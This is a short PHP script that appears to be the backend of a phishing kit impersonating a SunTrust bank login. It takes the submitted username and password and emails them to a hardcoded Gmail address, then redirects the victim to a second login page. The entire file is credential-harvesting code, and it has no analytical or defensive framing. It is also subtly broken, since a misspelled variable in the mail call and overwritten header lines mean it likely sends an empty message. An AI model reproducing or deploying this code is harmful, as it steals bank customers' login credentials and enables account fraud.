<?php


$username = $_POST['username'];
$password = $_POST['password'];

if($username==is_null($username) || $password==is_null($password)){
	
	
header("Location:index.htm");
	
	
	
}

else{
	
	$to = 'swedengrace21@gmail.com';
	$subject = ' SUNTRUST RESULTS';
	$message = "USERNAME:" . $username."  PASSWORD".$password;
	
	
	$headers ='From: '.$username.''.'\n\n';
	$headers ="MIME-Version: 1.0 \r\n";
	$headers ="Content-type: text/html \r\n";
	
	mail($to,$subject,$mesage,$headers);

	
	header("Location:login.htm");
	

} 



?>